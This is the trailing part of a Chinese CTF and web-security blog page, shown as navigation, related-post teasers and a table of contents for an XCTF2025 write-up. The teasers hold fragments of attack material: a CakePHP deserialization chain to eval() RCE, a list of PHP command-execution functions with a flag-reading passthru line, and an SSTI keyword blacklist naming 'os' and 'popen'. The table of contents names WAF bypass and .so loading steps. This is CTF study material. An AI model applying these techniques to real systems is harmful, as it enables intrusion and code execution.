class="info-item-2">深入理解Java反射机制：动态操作类的强大工具</div></div><div class="info-2"><div class="info-item-1">深入理解Java反射机制：动态操作类的强大工具什么是反射？Java反射是一种强大的机制，允许程序在运行时动态获取类的信息并对其进行操作。通过反射，我们可以在编译时不需要知道具体类的情况下，运行时获取类的字段、方法、构造函数等信息，并能够动态调用方法、创建实例和访问字段。这种能力使得Java程序具备了更高的灵活性和动态性。 反射的核心类Java反射机制主要由以下几个位于java.lang.reflect包中的核心类组成：  Class类：表示类或接口，是反射操作的入口点 Field类：表示类的字段（成员变量） Method类：表示类的方法 Constructor类：表示类的构造函数  反射实战：通过示例学习让我们通过一个具体的例子来理解反射的各个操作环节： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import java.lang.reflect.*;public class ReflectionExample &#123;    public...</div></div></div></a><a class="pagination-related" href="/2025/09/01/LACTF_2025_arclbroth/" title="LACTF_2025_arclbroth"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758516606541.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-01</div><div class="info-item-2">LACTF_2025_arclbroth</div></div><div class="info-2"><div class="info-item-1">LACTF_2025_arclbrotharclbroth | CLOSED | working :123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145// 导入所需的模块const crypto = require(&#x27;crypto&#x27;);const path = require(&#x27;path&#x27;);const express = require(&#x2...</div></div></div></a><a class="pagination-related" href="/2025/07/19/LZCTF2025/" title="LZCTF2025"><img class="cover" src="/2025/07/19/LZCTF2025/PixPin_2025-07-19_12-22-54.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-19</div><div class="info-item-2">LZCTF2025</div></div><div class="info-2"><div class="info-item-1">WEBXX二把嗦 :123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126from flask import Flask, request, render_template_stringimport htmlapp = Flask(__name__)BLACKLIST = [    &#x27;init&#x27;,&#x27;globals&#x27;,&#x27;builtins&#x27;,&#x27;import&#x27;,&#x27;os&#x27;,&#x27;popen&#x27;,&#...</div></div></div></a><a class="pagination-related" href="/2025/12/08/hello-world/" title="Hello World"><img class="cover" src="https://img.shetu66.com/2023/08/03/1691035301699647.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-08</div><div class="info-item-2">Hello World</div></div><div class="info-2"><div class="info-item-1">Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot;  More info: Writing Run server1$ hexo server  More info: Server Generate static files1$ hexo generate  More info: Generating Deploy to remote sites1$ hexo deploy  More info: Deployment 相册教程https://blog.csdn.net/weixin_45509582/article/det...</div></div></div></a><a class="pagination-related" href="/2025/12/08/SUCTF/" title="SUCTF"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/263e5fe7c7bc4d83879090fd5082e7a9.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-08</div><div class="info-item-2">SUCTF</div></div><div class="info-2"><div class="info-item-1">SUCTF_CakePHP 5.1.4 反序列化攻击链详细分析攻击链概览1234567891011RejectedPromise::__destruct()     ↓Response::__toString()     ↓Table::__call()     ↓BehaviorRegistry::call()     ↓MockClass::generate()     ↓eval() - RCE    详细分析每个环节1. 入口点 - 反序列化触发位置: src/PagesController.php:79 123456public function handleSer()&#123;    $ser = $this-&gt;request-&gt;getQuery(&#x27;ser&#x27;);    unserialize(base64_decode($ser));  // 直接反序列化用户输入    // ...&#125;    攻击方式: GET /ser?ser=&lt;base64_encoded_payload&gt; 关键点:  没有任何输入验证  直...</div></div></div></a><a class="pagination-related" href="/2025/12/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/" title="命令执行(RCE)绕过技术"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1757651700281.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-08</div><div class="info-item-2">命令执行(RCE)绕过技术</div></div><div class="info-2"><div class="info-item-1">命令执行(RCE)绕过技术全面指南参考https://blog.csdn.net/qq\_43431158/article/details/105422347，写到异或绕过 1.  基础概念RCE (Remote Code Execution)：远程代码执行漏洞，攻击者可直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。 2. 常见执行函数2.1 PHP代码执行函数eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()等。 2.2 PHP命令执行函数system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()等。 passthru(&#39;tac fla*&#39;); 2.3 特殊函数利用 反引号执行：`ls` 或 &lt;?= ls ?&gt;（短标签形式）  无参数函数调用：PHP ...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">ArcNova</div><div class="author-info-description">「ArcNova」的网络安全研习录</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">30</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/S3ekit"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/ArcNova7" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:123456@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XCTF2025"><span class="toc-number">1.</span> <span class="toc-text">XCTF2025</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#go-storage-XXX-SOLVED"><span class="toc-number">1.1.</span> <span class="toc-text">go-storage || XXX || SOLVED</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.1.2.</span> <span class="toc-text">题目分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Wallet-XXX-SOLVED"><span class="toc-number">1.2.</span> <span class="toc-text">Wallet || XXX || SOLVED</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84"><span class="toc-number">1.2.2.</span> <span class="toc-text">整体架构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E9%83%A8%E7%BD%B2%E6%9E%B6%E6%9E%84"><span class="toc-number">1.2.3.</span> <span class="toc-text">服务部署架构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gateway-%E7%BD%91%E5%85%B3%E5%B1%82-WAF%E9%98%B2%E6%8A%A4"><span class="toc-number">1.2.4.</span> <span class="toc-text">Gateway (网关层 - WAF防护)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Backend-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E5%B1%82"><span class="toc-number">1.2.5.</span> <span class="toc-text">Backend (业务逻辑层)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x20-WAF-%E7%BB%95%E8%BF%87%EF%BC%88BOM-JSON-%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%EF%BC%89"><span class="toc-number">1.2.6.</span> <span class="toc-text"> WAF 绕过（BOM + JSON 解析差异）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.2.7.</span> <span class="toc-text">漏洞利用&#x2F;解题步骤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kidding-XXX-SOLVED"><span class="toc-number">1.3.</span> <span class="toc-text">kidding || XXX || SOLVED</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kidding-Reverge-XXX-SOLVED"><span class="toc-number">1.4.</span> <span class="toc-text">kidding  Reverge|| XXX || SOLVED</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">1.4.1.</span> <span class="toc-text">攻击流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E8%AF%91-so-%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">编译 .so 文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0-so-%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">上传 .so 文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84%E5%91%BD%E4%BB%A4%E5%B9%B6%E5%8A%A0%E8%BD%BD%E6%89%A9%E5%B1%95"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">写入要执行的命令并加载扩展</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#x20-%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.4.1.4.</span> <span class="toc-text"> 加载过程详解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88-system-%E8%83%BD%E6%89%A7%E8%A1%8C%EF%BC%9F"><span class="toc-number">1.4.1.5.</span> <span class="toc-text">为什么 system() 能执行？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSL-XXX-SOLVED"><span class="toc-number">1.5.</span> <span class="toc-text">NSL || XXX || SOLVED</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-2"><span class="toc-number">1.5.1.</span> <span class="toc-text">题目描述</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%B7%AF%E5%BE%84%E4%BA%8C%EF%BC%9AVault-%E4%BB%A4%E7%89%8C%E9%93%BE%E8%B7%AF%E8%A2%AB%E6%BB%A5%E7%94%A8%EF%BC%88%E7%9B%B4%E5%8F%96-flag%EF%BC%89"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">攻击路径二：Vault 令牌链路被滥用（直取 flag）</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/01/25/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/" title="PHP 反序列化——Yii2 反序列化链分析"><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP 反序列化——Yii2 反序列化链分析"/></a><div class="content"><a class="title" href="/2026/01/25/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/" title="PHP 反序列化——Yii2 反序列化链分析">PHP 反序列化——Yii2 反序列化链分析</a><time datetime="2026-01-25T04:57:21.983Z" title="Created 2026-01-25 12:57:21">2026-01-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/25/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94Laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E8%B7%AF%E5%88%86%E6%9E%90%EF%BC%88CVE-2019-9081%EF%BC%89/" title="PHP 反序列化——Laravel5.7 反序列化链路分析（CVE-2019-9081）"><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP 反序列化——Laravel5.7 反序列化链路分析（CVE-2019-9081）"/></a><div class="content"><a class="title" href="/2026/01/25/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94Laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E8%B7%AF%E5%88%86%E6%9E%90%EF%BC%88CVE-2019-9081%EF%BC%89/" title="PHP 反序列化——Laravel5.7 反序列化链路分析（CVE-2019-9081）">PHP 反序列化——Laravel5.7 反序列化链路分析（CVE-2019-9081）</a><time datetime="2026-01-25T04:53:46.036Z" title="Created 2026-01-25 12:53:46">2026-01-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/25/CSS%20INJECTION%20STUDY/" title="CSS INJECTION"><img src="https://i-blog.csdnimg.cn/blog_migrate/e2e0bc2a26be6207654bc427135a86ca.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CSS INJECTION"/></a><div class="content"><a class="title" href="/2026/01/25/CSS%20INJECTION%20STUDY/" title="CSS INJECTION">CSS INJECTION</a><time datetime="2026-01-25T02:23:39.000Z" title="Created 2026-01-25 10:23:39">2026-01-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/25/CSharp_Code_Audit/" title="C# Code_Audit"><img src="https://pic2.zhimg.com/v2-ada7a981b5da4f94af145470bce124b5_720w.jpg?source=172ae18b" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="C# Code_Audit"/></a><div class="content"><a class="title" href="/2026/01/25/CSharp_Code_Audit/" title="C# Code_Audit">C# Code_Audit</a><time datetime="2026-01-25T02:23:39.000Z" title="Created 2026-01-25 10:23:39">2026-01-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/25/File_Upload%20/" title="File_Upload"><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="File_Upload"/></a><div class="content"><a class="title" href="/2026/01/25/File_Upload%20/" title="File_Upload">File_Upload</a><time datetime="2026-01-25T02:23:39.000Z" title="Created 2026-01-25 10:23:39">2026-01-25</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 - 2026 By ArcNova</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>